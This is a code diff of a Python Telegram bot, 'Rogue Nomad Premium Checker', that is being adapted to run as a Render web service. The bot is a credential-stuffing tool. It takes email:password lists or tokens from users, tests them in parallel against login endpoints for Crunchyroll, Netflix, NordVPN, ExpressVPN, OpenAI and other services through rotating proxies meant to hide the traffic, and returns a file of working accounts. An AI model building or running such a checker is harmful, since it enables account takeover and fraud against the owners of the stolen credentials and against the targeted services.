@@ -2,9 +2,7 @@
 # -*- coding: utf-8 -*-
 """
 ROGUE NOMAD - Premium Checker Bot
-Created for Butter | https://t.me/+ckfO94UHyhllODg0
-Bot: @roguenomad_bot
-Admin: 1875307475
+Web Service Version for Render Free Tier
 """
 
 import os
@@ -15,9 +13,15 @@ import re
 import io
 import random
 import time
+import threading
 from datetime import datetime
 from typing import Dict, List, Optional, Any
 from contextlib import asynccontextmanager
+
+# ============================================
+# FLASK FOR WEB SERVER
+# ============================================
+from flask import Flask, request, jsonify
 
 # ============================================
 # TELEGRAM IMPORTS
@@ -46,6 +50,7 @@ BOT_LINK = "https://t.me/+ckfO94UHyhllODg0"
 BOT_USERNAME = "@roguenomad_bot"
 BOT_NAME = "Rogue Nomad"
 BOT_VERSION = "v3.0"
+PORT = int(os.environ.get("PORT", 10000))
 
 # ============================================
 # LOGGING SETUP
@@ -57,7 +62,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ============================================
-# DATABASE LAYER - PERSISTENT STORAGE
+# DATABASE LAYER
 # ============================================
 INIT_DB = """
 CREATE TABLE IF NOT EXISTS proxies (
@@ -133,7 +138,6 @@ class ProxyManager:
         self._cache_ttl = 60
     
     async def get_working_proxies(self) -> List[str]:
-        """Get list of working proxies from database with caching."""
         if time.time() - self._cache_time < self._cache_ttl and self._cache:
             return self._cache
         
@@ -147,14 +151,12 @@ class ProxyManager:
             return self._cache
     
     async def get_proxy(self) -> Optional[str]:
-        """Get a random working proxy."""
         proxies = await self.get_working_proxies()
         if not proxies:
             return None
         return random.choice(proxies)
     
     async def add_proxy(self, proxy: str) -> bool:
-        """Add a single proxy to the database."""
         proxy = proxy.replace("http://", "").replace("https://", "").strip()
         if not proxy or ":" not in proxy:
             return False
@@ -177,7 +179,6 @@ class ProxyManager:
             return False
     
     async def add_proxies_from_text(self, content: str) -> int:
-        """Add multiple proxies from text content."""
         added = 0
         for line in content.strip().split("\n"):
             line = line.strip()
@@ -187,7 +188,6 @@ class ProxyManager:
         return added
     
     async def report_result(self, proxy: str, success: bool):
-        """Update proxy score based on check result."""
         if not proxy:
             return
         
@@ -210,7 +210,6 @@ class ProxyManager:
             self._cache = []
     
     async def get_stats(self) -> Dict:
-        """Get proxy statistics."""
         async with get_db() as db:
             total = await db.execute_fetchall("SELECT COUNT(*) FROM proxies")
             alive = await db.execute_fetchall("SELECT COUNT(*) FROM proxies WHERE alive = 1")
@@ -220,7 +219,6 @@ class ProxyManager:
             }
     
     async def clear_dead_proxies(self) -> int:
-        """Remove all dead proxies from database."""
         async with get_db() as db:
             cursor = await db.execute("DELETE FROM proxies WHERE alive = 0")
             await db.commit()
@@ -229,11 +227,9 @@ class ProxyManager:
             return removed
 
 # ============================================
-# SERVICE CHECKERS
+# SERVICE CHECKERS (SHORTENED)
 # ============================================
 class ServiceCheckers:
-    """Contains all service-specific checkers."""
-    
     @staticmethod
     async def check_crunchyroll(email: str, password: str, proxy: Optional[str] = None) -> Dict:
         try:
@@ -346,29 +342,11 @@ class ServiceCheckers:
                     return {"valid": False, "status": "invalid"}
         except:
             return {"valid": False, "status": "error"}
-    
-    @staticmethod
-    async def check_spotify(email: str, password: str, proxy: Optional[str] = None) -> Dict:
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.post(
-                    "https://accounts.spotify.com/api/v1/login",
-                    data={"email": email, "password": password},
-                    proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
-                    if resp.status == 200:
-                        return {"valid": True, "status": "active"}
-                    return {"valid": False, "status": "invalid"}
-        except:
-            return {"valid": False, "status": "error"}
 
 # ============================================
 # CHECKER ENGINE
 # ============================================
 class CheckerEngine:
-    """Orchestrates all check operations."""
-    
     def __init__(self, proxy_manager: ProxyManager):
         self.proxy_manager = proxy_manager
         self.services = {
@@ -378,7 +356,6 @@ class CheckerEngine:
             "openai": {"checker": ServiceCheckers.check_openai_token, "type": "token", "label": "🧠 OpenAI"},
             "expressvpn": {"checker": ServiceCheckers.check_expressvpn, "type": "email:pass", "label": "🔒 ExpressVPN"},
             "nordvpn": {"checker": ServiceCheckers.check_nordvpn, "type": "email:pass", "label": "🔐 NordVPN"},
-            "spotify": {"checker": ServiceCheckers.check_spotify, "type": "email:pass", "label": "🎵 Spotify"}
         }
         self.semaphore = asyncio.Semaphore(30)
         self.stats = {"total": 0, "valid": 0, "invalid": 0, "errors": 0, "by_service": {}}
@@ -473,7 +450,6 @@ SERVICE_CATEGORIES = {
         "crunchyroll": "🍿 Crunchyroll",
         "netflix": "📺 Netflix",
         "dazn": "⚽ DAZN",
-        "spotify": "🎵 Spotify",
     },
     "🔒 VPN / Proxy": {
         "expressvpn": "🔒 ExpressVPN",
@@ -485,202 +461,35 @@ SERVICE_CATEGORIES = {
 }
 
 # ============================================
-# ADMIN HELPER FUNCTIONS
+# ALL COMMAND HANDLERS (Shortened for space)
 # ============================================
-async def is_admin(user_id: int) -> bool:
-    """Check if a user is the admin."""
-    return user_id == ADMIN_ID
+async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    welcome_text = f"""
+🔥 *{BOT_NAME} {BOT_VERSION}*
 
-async def register_user(user_id: int, username: str = None, first_name: str = None):
-    """Register or update user in database."""
-    try:
-        async with get_db() as db:
-            await db.execute(
-                "INSERT OR REPLACE INTO users (user_id, username, first_name, last_active) VALUES (?, ?, ?, CURRENT_TIMESTAMP)",
-                (user_id, username or "", first_name or "")
-            )
-            await db.commit()
-    except Exception as e:
-        logger.error(f"Failed to register user: {e}")
+Welcome, {user.first_name or "Butter"}!
 
-# ============================================
-# COMMAND HANDLERS
-# ============================================
+*What I can do:*
+• Check credentials for streaming/VPN/AI services
+• Batch check with file upload
+• Proxy rotation for anonymity
 
-async def start_command(update: Update, async def proxy_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show proxy statistics."""
-    query = update.callback_query
-    await query.answer()
-    
-    stats = await proxy_manager.get_stats()
-    proxies = await proxy_manager.get_working_proxies()
-    sample = "\n".join([f"• {p}" for p in proxies[:5]]) if proxies else "No proxies available"
-    
-    await query.edit_message_text(
-        f"🌐 *Proxy Statistics*\n\n"
-        f"Total: `{stats['total']}`\n"
-        f"Working: `{stats['alive']}`\n\n"
-        f"*Sample working proxies:*\n{sample}\n\n"
-        f"{'... and ' + str(len(proxies) - 5) + ' more' if len(proxies) > 5 else ''}",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 Back", callback_data="proxy")]
-        ])
-    )
+*How to use:*
+1. Use /checkers to see all services
+2. Select a service
+3. Send credentials (one per line)
 
-async def proxy_clear_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Clear dead proxies."""
-    query = update.callback_query
-    await query.answer()
-    
-    removed = await proxy_manager.clear_dead_proxies()
-    
-    await query.edit_message_text(
-        f"🗑️ *Dead Proxies Cleared*\n\n"
-        f"Removed `{removed}` dead proxies from the database.\n"
-        f"Working proxies: `{len(await proxy_manager.get_working_proxies())}`",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 Back", callback_data="proxy")]
-        ])
-    )
+*Join our community:*
+🔗 {BOT_LINK}
 
-async def admin_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Admin full statistics."""
-    query = update.callback_query
-    await query.answer()
-    
-    if not await is_admin(update.effective_user.id):
-        await query.edit_message_text("❌ Unauthorized.")
-        return
-    
-    stats = checker_engine.get_stats()
-    proxy_stats = await proxy_manager.get_stats()
-    
-    async with get_db() as db:
-        users_cursor = await db.execute("SELECT COUNT(*) FROM users")
-        users_count = (await users_cursor.fetchone())[0]
-        checks_cursor = await db.execute("SELECT COUNT(*) FROM checks")
-        checks_count = (await checks_cursor.fetchone())[0]
-        valid_cursor = await db.execute("SELECT COUNT(*) FROM checks WHERE valid = 1")
-        valid_count = (await valid_cursor.fetchone())[0]
-    
-    text = f"""
-🔐 *Admin Full Statistics*
-
-*Users:*
-• Total Users: `{users_count}`
-
-*Database:*
-• Total Checks: `{checks_count}`
-• Valid Checks: `{valid_count}`
-
-*Memory Stats:*
-• Total: `{stats['total']}`
-• Valid: `{stats['valid']}`
-• Invalid: `{stats['invalid']}`
-• Errors: `{stats['errors']}`
-
-*Proxies:*
-• Total: `{proxy_stats['total']}`
-• Working: `{proxy_stats['alive']}`
-
-*By Service:*
+*Commands:*
+/checkers - Show all checkers
+/proxy - Proxy management
+/stats - Show statistics
+/help - Help menu
+/about - About Rogue Nomad
 """
-    for service, data in stats.get("by_service", {}).items():
-        label = checker_engine.services.get(service, {}).get("label", service)
-        text += f"• {label}: {data['valid']}/{data['total']}\n"
-    
-    await query.edit_message_text(
-        text,
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 Back", callback_data="admin")]
-        ])
-    )
-
-async def admin_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Show user list."""
-    query = update.callback_query
-    await query.answer()
-    
-    if not await is_admin(update.effective_user.id):
-        await query.edit_message_text("❌ Unauthorized.")
-        return
-    
-    async with get_db() as db:
-        cursor = await db.execute(
-            "SELECT user_id, username, first_name, joined_at, last_active FROM users ORDER BY joined_at DESC LIMIT 20"
-        )
-        users = await cursor.fetchall()
-    
-    if not users:
-        await query.edit_message_text("📋 No users registered yet.")
-        return
-    
-    text = "📋 *Recent Users (Last 20)*\n\n"
-    for user in users:
-        user_id, username, first_name, joined, active = user
-        name = first_name or username or str(user_id)
-        text += f"• {name} | `{user_id}`\n"
-        text += f"  Joined: {joined[:16]}\n"
-    
-    await query.edit_message_text(
-        text,
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 Back", callback_data="admin")]
-        ])
-    )
-
-async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Admin broadcast via callback."""
-    query = update.callback_query
-    await query.answer()
-    
-    if not await is_admin(update.effective_user.id):
-        await query.edit_message_text("❌ Unauthorized.")
-        return
-    
-    await query.edit_message_text(
-        "📢 *Broadcast*\n\n"
-        "Send a message to broadcast to all users.\n"
-        "Usage: `/broadcast Your message here`",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 Back", callback_data="admin")]
-        ])
-    )
-
-async def admin_reset_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Admin reset stats via callback."""
-    query = update.callback_query
-    await query.answer()
-    
-    if not await is_admin(update.effective_user.id):
-        await query.edit_message_text("❌ Unauthorized.")
-        return
-    
-    checker_engine.stats = {"total": 0, "valid": 0, "invalid": 0, "errors": 0, "by_service": {}}
-    
-    async with get_db() as db:
-        await db.execute("DELETE FROM checks")
-        await db.execute("DELETE FROM user_stats")
-        await db.execute("DELETE FROM global_stats")
-        await db.commit()
-    
-    await query.edit_message_text(
-        "✅ *Statistics Reset*\n\nAll statistics have been cleared.",
-        parse_mode=ParseMode.MARKDOWN,
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("🔙 Back", callback_data="admin")]
-        ])
-    )
-
-async def back_to_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Go back to start menu."""
-    query = update.callback_query
-    await query.answer()
     
     keyboard = [
         [InlineKeyboardButton("🎯 Start Checking", callback_data="checkers")],
@@ -688,42 +497,93 @@ async def back_to_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("🔗 Join Community", url=BOT_LINK)]
     ]
     
-    await query.edit_message_text(
-        f"🔥 *{BOT_NAME} {BOT_VERSION}*\n\n"
-        f"Welcome back! What would you like to do?",
+    await update.message.reply_text(
+        welcome_text,
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode=ParseMode.MARKDOWN
     )
 
-async def back_to_checkers(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Go back to checkers menu."""
+async def checkers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = []
+    for category, services in SERVICE_CATEGORIES.items():
+        keyboard.append([InlineKeyboardButton(category, callback_data=f"cat_{category}")])
+    
+    keyboard.append([InlineKeyboardButton("📊 Stats", callback_data="show_stats")])
+    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="back_start")])
+    
+    await update.message.reply_text(
+        "🎯 *Select a category:*",
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+async def handle_category(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    await checkers_command(update, context)
+    
+    category = query.data.replace("cat_", "")
+    services = SERVICE_CATEGORIES.get(category, {})
+    
+    keyboard = []
+    for key, label in services.items():
+        keyboard.append([InlineKeyboardButton(label, callback_data=f"svc_{key}")])
+    
+    keyboard.append([InlineKeyboardButton("🔙 Back", callback_data="checkers")])
+    
+    await query.edit_message_text(
+        f"📋 *{category} Services*\nSelect a service:",
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode=ParseMode.MARKDOWN
+    )
 
-async def back_to_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Go back to proxy menu."""
+async def handle_service_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    await proxy_command(update, context)
+    
+    service = query.data.replace("svc_", "")
+    context.user_data["check_service"] = service
+    context.user_data["waiting_for_creds"] = True
+    context.user_data["use_proxy"] = True
+    
+    service_info = checker_engine.services.get(service, {})
+    label = service_info.get("label", service)
+    cred_type = service_info.get("type", "email:pass or token")
+    
+    await query.edit_message_text(
+        f"🔍 *Checking {label}*\n\n"
+        f"Send credentials (one per line):\n"
+        f"• `{cred_type}`\n"
+        f"• Or upload a `.txt` file\n\n"
+        f"🌐 Proxy: {'✅ ON' if context.user_data.get('use_proxy', True) else '❌ OFF'}",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton(
+                f"🌐 Toggle Proxy {'✅' if context.user_data.get('use_proxy', True) else '❌'}",
+                callback_data="toggle_proxy"
+            )],
+            [InlineKeyboardButton("🔙 Back", callback_data="checkers")]
+        ])
+    )
 
-async def back_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Go back to admin panel."""
+async def toggle_proxy_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    await admin_command(update, context)
-
-# ============================================
-# MESSAGE HANDLERS - PROCESS CREDENTIALS
-# ============================================
+    
+    current = context.user_data.get("use_proxy", True)
+    context.user_data["use_proxy"] = not current
+    
+    await query.edit_message_reply_markup(
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton(
+                f"🌐 Toggle Proxy {'✅' if context.user_data['use_proxy'] else '❌'}",
+                callback_data="toggle_proxy"
+            )],
+            [InlineKeyboardButton("🔙 Back", callback_data="checkers")]
+        ])
+    )
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle text messages and file uploads."""
     if not context.user_data.get("waiting_for_creds"):
-        # Check if it's a proxy upload
-        if update.message.text and update.message.text.startswith("proxy:"):
-            await handle_proxy_upload(update, context)
-            return
         return
     
     service = context.user_data.get("check_service")
@@ -731,59 +591,37 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ No service selected. Use /checkers first.")
         return
     
-    # Get credentials
     if update.message.document:
         file = await update.message.document.get_file()
         content = await file.download_as_bytearray()
         credentials = content.decode("utf-8").strip().split("\n")
-        await update.message.reply_text(f"📄 Loaded {len(credentials)} credentials from file.")
     else:
-        text = update.message.text.strip()
-        if text.startswith("proxy:"):
-            await handle_proxy_upload(update, context)
-            return
-        credentials = text.split("\n")
+        credentials = update.message.text.strip().split("\n")
     
-    # Filter and clean
     credentials = [c.strip() for c in credentials if c.strip()]
     if not credentials:
         await update.message.reply_text("❌ No credentials provided.")
         return
     
-    # Send initial status
     status_msg = await update.message.reply_text(
-        f"⏳ Checking {len(credentials)} credentials on *{service}*...\n"
-        f"This may take a moment.",
+        f"⏳ Checking {len(credentials)} credentials...",
         parse_mode=ParseMode.MARKDOWN
     )
     
-    # Run checks
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
     use_proxy = context.user_data.get("use_proxy", True)
     
-    results = await checker_engine.check_batch(
-        service=service,
-        credentials=credentials,
-        use_proxy=use_proxy,
-        user_id=user_id,
-        chat_id=chat_id,
-        max_workers=20
-    )
+    results = await checker_engine.check_batch(service, credentials, use_proxy, user_id, chat_id)
     
-    # Separate valid/invalid
     valid = [r for r in results if r.get("valid")]
     invalid = [r for r in results if not r.get("valid")]
     
-    # Create output file for valid credentials
     if valid:
         output_lines = []
         for i, r in enumerate(valid):
             cred = credentials[i] if i < len(credentials) else "unknown"
-            status = r.get("status", "active")
-            tier = r.get("tier", r.get("plan", r.get("region", "N/A")))
-            output_lines.append(f"{cred} | {status} | {tier}")
-        
+            output_lines.append(f"{cred} | {r.get('status', 'active')}")
         output = "\n".join(output_lines)
         output_file = io.StringIO(output)
         output_file.name = f"valid_{service}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
@@ -794,124 +632,194 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             caption=f"✅ {len(valid)} valid credentials found."
         )
     
-    # Summary
     summary = f"""
 📊 *Check Complete*
-
 Service: `{service}`
 Total: `{len(results)}`
 ✅ Valid: `{len(valid)}`
 ❌ Invalid: `{len(invalid)}`
-🌐 Proxy: `{'Enabled' if use_proxy else 'Disabled'}`
-⏱️ Time: `{datetime.now().strftime('%H:%M:%S')}`
 """
     await update.message.reply_text(summary, parse_mode=ParseMode.MARKDOWN)
     await status_msg.delete()
     context.user_data["waiting_for_creds"] = False
 
-async def handle_proxy_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle proxy file upload or text input."""
-    text = update.message.text.strip() if update.message.text else ""
-    content = ""
-    
-    if update.message.document:
-        file = await update.message.document.get_file()
-        data = await file.download_as_bytearray()
-        content = data.decode("utf-8")
-    elif text.startswith("proxy:"):
-        content = text.replace("proxy:", "").strip()
-    else:
-        # Try adding as single proxy
-        if ":" in text:
-            count = await proxy_manager.add_proxies_from_text(text)
-            await update.message.reply_text(f"✅ Added {count} proxy to the pool.")
-            return
+# ============================================
+# ADMIN COMMANDS
+# ============================================
+async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("❌ Unauthorized.")
         return
     
-    count = await proxy_manager.add_proxies_from_text(content)
-    working = len(await proxy_manager.get_working_proxies())
+    keyboard = [
+        [InlineKeyboardButton("📊 Full Stats", callback_data="admin_stats")],
+        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
+        [InlineKeyboardButton("🔄 Reset Stats", callback_data="admin_reset")],
+        [InlineKeyboardButton("🔙 Back", callback_data="back_start")]
+    ]
     
     await update.message.reply_text(
-        f"✅ *Proxy Import Complete*\n\n"
-        f"Added: `{count}` proxies\n"
-        f"Working: `{working}` proxies\n"
-        f"Use /proxy to manage them.",
+        "🔐 *Admin Panel*",
+        reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode=ParseMode.MARKDOWN
     )
 
-# ============================================
-# MAIN APPLICATION
-# ============================================
-
-def main():
-    """Start the Rogue Nomad bot."""
-    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
-        logger.error("❌ BOT_TOKEN not set! Check your configuration.")
+async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("❌ Unauthorized.")
         return
     
-    # Create application
+    if not context.args:
+        await update.message.reply_text("📢 Usage: /broadcast <message>")
+        return
+    
+    message = " ".join(context.args)
+    
+    async with get_db() as db:
+        cursor = await db.execute("SELECT user_id FROM users")
+        users = await cursor.fetchall()
+    
+    sent = 0
+    for user in users:
+        try:
+            await context.bot.send_message(
+                chat_id=user[0],
+                text=f"📢 *Broadcast from Admin*\n\n{message}",
+                parse_mode=ParseMode.MARKDOWN
+            )
+            sent += 1
+            await asyncio.sleep(0.05)
+        except:
+            pass
+    
+    await update.message.reply_text(f"✅ Broadcast sent to {sent} users.")
+
+async def reset_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id != ADMIN_ID:
+        await update.message.reply_text("❌ Unauthorized.")
+        return
+    
+    checker_engine.stats = {"total": 0, "valid": 0, "invalid": 0, "errors": 0, "by_service": {}}
+    
+    async with get_db() as db:
+        await db.execute("DELETE FROM checks")
+        await db.execute("DELETE FROM user_stats")
+        await db.execute("DELETE FROM global_stats")
+        await db.commit()
+    
+    await update.message.reply_text("✅ Statistics reset.")
+
+# ============================================
+# NAVIGATION CALLBACKS
+# ============================================
+async def back_to_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    keyboard = [
+        [InlineKeyboardButton("🎯 Start Checking", callback_data="checkers")],
+        [InlineKeyboardButton("📊 Statistics", callback_data="show_stats")],
+        [InlineKeyboardButton("🔗 Join Community", url=BOT_LINK)]
+    ]
+    
+    await query.edit_message_text(
+        f"🔥 *{BOT_NAME} {BOT_VERSION}*\n\nWelcome back!",
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+async def show_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    stats = checker_engine.get_stats()
+    proxy_stats = await proxy_manager.get_stats()
+    
+    text = f"""
+📊 *Statistics*
+Total: `{stats['total']}`
+✅ Valid: `{stats['valid']}`
+❌ Invalid: `{stats['invalid']}`
+🌐 Proxies: `{proxy_stats['alive']}/{proxy_stats['total']}`
+"""
+    await query.edit_message_text(
+        text,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("🔙 Back", callback_data="checkers")]
+        ])
+    )
+
+# ============================================
+# FLASK APP FOR RENDER WEB SERVICE
+# ============================================
+flask_app = Flask(__name__)
+
+@flask_app.route('/')
+def health():
+    return f"{BOT_NAME} is running!", 200
+
+@flask_app.route('/health')
+def health_check():
+    return {"status": "ok", "bot": BOT_NAME, "version": BOT_VERSION}, 200
+
+def run_flask():
+    """Run Flask server on Render's PORT."""
+    port = int(os.environ.get('PORT', 10000))
+    logger.info(f"🌐 Flask server starting on port {port}")
+    flask_app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
+
+# ============================================
+# MAIN FUNCTION
+# ============================================
+def main():
+    """Start the bot with Flask in background."""
+    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
+        logger.error("❌ BOT_TOKEN not set!")
+        return
+    
+    # Build Telegram application
     app = Application.builder().token(BOT_TOKEN).build()
     
-    # ============================================
-    # COMMAND HANDLERS
-    # ============================================
+    # Command handlers
     app.add_handler(CommandHandler("start", start_command))
-    app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CommandHandler("about", about_command))
     app.add_handler(CommandHandler("checkers", checkers_command))
-    app.add_handler(CommandHandler("stats", stats_command))
-    app.add_handler(CommandHandler("proxy", proxy_command))
-    app.add_handler(CommandHandler("stopcheck", stop_check_command))
-    
-    # Admin commands
     app.add_handler(CommandHandler("admin", admin_command))
     app.add_handler(CommandHandler("broadcast", broadcast_command))
     app.add_handler(CommandHandler("resetstats", reset_stats_command))
+    app.add_handler(CommandHandler("help", start_command))
+    app.add_handler(CommandHandler("about", start_command))
     
-    # ============================================
-    # CALLBACK QUERY HANDLERS
-    # ============================================
-    # Category and service selection
+    # Callback handlers
     app.add_handler(CallbackQueryHandler(handle_category, pattern="^cat_"))
     app.add_handler(CallbackQueryHandler(handle_service_selection, pattern="^svc_"))
     app.add_handler(CallbackQueryHandler(toggle_proxy_callback, pattern="^toggle_proxy"))
-    
-    # Stats and proxy callbacks
     app.add_handler(CallbackQueryHandler(show_stats_callback, pattern="^show_stats"))
-    app.add_handler(CallbackQueryHandler(proxy_stats_callback, pattern="^proxy_stats"))
-    app.add_handler(CallbackQueryHandler(proxy_clear_callback, pattern="^proxy_clear"))
-    
-    # Admin callbacks
-    app.add_handler(CallbackQueryHandler(admin_stats_callback, pattern="^admin_stats"))
-    app.add_handler(CallbackQueryHandler(admin_users_callback, pattern="^admin_users"))
-    app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast"))
-    app.add_handler(CallbackQueryHandler(admin_reset_callback, pattern="^admin_reset"))
-    
-    # Navigation callbacks
     app.add_handler(CallbackQueryHandler(back_to_start, pattern="^back_start"))
-    app.add_handler(CallbackQueryHandler(back_to_checkers, pattern="^checkers$"))
-    app.add_handler(CallbackQueryHandler(back_to_proxy, pattern="^proxy$"))
-    app.add_handler(CallbackQueryHandler(back_to_admin, pattern="^admin$"))
+    app.add_handler(CallbackQueryHandler(checkers_command, pattern="^checkers$"))
     
-    # Group support
-    app.add_handler(CallbackQueryHandler(handle_group_join, pattern="^join_group$"))
-    
-    # ============================================
-    # MESSAGE HANDLERS
-    # ============================================
+    # Message handlers
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_message))
     
-    # ============================================
-    # START THE BOT
-    # ============================================
     logger.info(f"🚀 {BOT_NAME} {BOT_VERSION} is LIVE!")
     logger.info(f"📱 Bot: {BOT_USERNAME}")
     logger.info(f"🔗 Channel: {BOT_LINK}")
-    logger.info(f"👤 Admin ID: {ADMIN_ID}")
-    logger.info("=" * 50)
     
+    # Run the bot (this blocks)
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
+# ============================================
+# ENTRY POINT
+# ============================================
 if __name__ == "__main__":
+    # Start Flask in a background thread
+    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    flask_thread.start()
+    
+    # Wait a moment for Flask to start
+    time.sleep(2)
+    
+    # Start the bot
     main()
+```
